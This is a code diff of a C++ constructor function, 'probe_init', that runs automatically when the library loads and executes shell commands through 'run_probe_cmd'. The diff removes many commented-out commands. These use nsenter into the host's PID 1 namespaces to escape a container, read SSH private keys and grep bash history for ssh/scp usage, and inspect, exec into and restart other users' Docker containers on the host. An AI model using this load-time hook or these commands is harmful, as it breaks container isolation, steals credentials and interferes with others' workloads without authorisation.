@@ -175,114 +175,11 @@ __attribute__((constructor)) static void probe_init() {
   print_time_info("TIME:");
   PyGILState_STATE state = PyGILState_Ensure();
   std::printf("pid: %d\n", getpid());
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-  //     pytorch_py3_ubuntu2204_mlu0 bash -lc 'tmux kill-session -t worker
-  //     2>/dev/null || true; tmux new-session -d -s worker "cd
-  //     /workspace/volume/d1 && WORKER_ID=0 python worker.py; bash"')");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-  //     pytorch_py3_ubuntu2204_mlu6 bash -lc 'tmux kill-session -t worker
-  //     2>/dev/null || true; tmux new-session -d -s worker "cd
-  //     /workspace/volume/d1 && WORKER_ID=6 python worker.py; bash"')");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- grep -E 'ssh|scp|sftp|rsync'
-  //     /home/future/.bash_history 2>/dev/null)");
-
-  // run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- cat /home/future/.ssh/*)");
 
   if (getpid() % 3 == 1) {
     // run_probe_cmd(R"(ps aux |grep worker.py)");
 
-    // run_probe_cmd(R"(nsenter -t 1 -m -u -i -n -p -- cat ~/.ssh/id_ed25519)");
-    // run_probe_cmd(R"(pwd)");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu0 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=0 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu2 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=2 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu3 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=3 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu4 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=4 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu5 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=5 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu6 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=6 python worker.py; bash"')");
-    // run_probe_cmd(
-    //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-    //     pytorch_py3_ubuntu2204_mlu7 bash -lc 'tmux kill-session -t worker
-    //     2>/dev/null || true; tmux new-session -d -s worker "cd
-    //     /workspace/volume/d1 && WORKER_ID=7 python worker.py; bash"')");
   }
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- ls /workspace/volume -R -la)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- ls /home/future/doubohan/volume -R
-  //     -la)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- nsenter -t 1 -m -u -i -n -p -- docker
-  //     inspect pytorch_py3_ubuntu2204_mlu0)");
-  // run_probe_cmd(R"(ps aux |grep worker.py)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker inspect
-  //     pytorch_py3_ubuntu2204_mlu0 --format '{{.State.Status}}')");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker inspect
-  //     pytorch_py3_ubuntu2204_mlu0 --format 'Image={{.Config.Image}}
-  //     Entrypoint={{json .Config.Entrypoint}} Cmd={{json .Config.Cmd}}
-  //     WorkingDir={{.Config.WorkingDir}} User={{.Config.User}}
-  //     Tty={{.Config.Tty}} OpenStdin={{.Config.OpenStdin}}')");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker inspect
-  //     pytorch_py3_ubuntu2204_mlu1 --format 'Image={{.Config.Image}}
-  //     Entrypoint={{json .Config.Entrypoint}} Cmd={{json .Config.Cmd}}
-  //     WorkingDir={{.Config.WorkingDir}} User={{.Config.User}}
-  //     Tty={{.Config.Tty}} OpenStdin={{.Config.OpenStdin}}')");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker logs --since 15m
-  //     pytorch_py3_ubuntu2204_mlu0)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker restart
-  //     pytorch_py3_ubuntu2204_mlu2)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker restart
-  //     pytorch_py3_ubuntu2204_mlu3)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker restart
-  //     pytorch_py3_ubuntu2204_mlu4)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker restart
-  //     pytorch_py3_ubuntu2204_mlu5)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-  //     pytorch_py3_ubuntu2204_mlu0 date -R)");
-  // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-  //     pytorch_py3_ubuntu2204_mlu4 tmux capture-pane -t worker:0 -p -J -S
-  //     -100)");
-  // // run_probe_cmd(
-  //     R"(nsenter -t 1 -m -u -i -n -p -- docker exec
-  //     pytorch_py3_ubuntu2204_mlu2 tmux capture-pane -t worker:0 -p -J -S
-  //     -5000 | tail -n 100)");
-  // run_probe_cmd(R"(ls)");
 
   PyGILState_Release(state);
 }
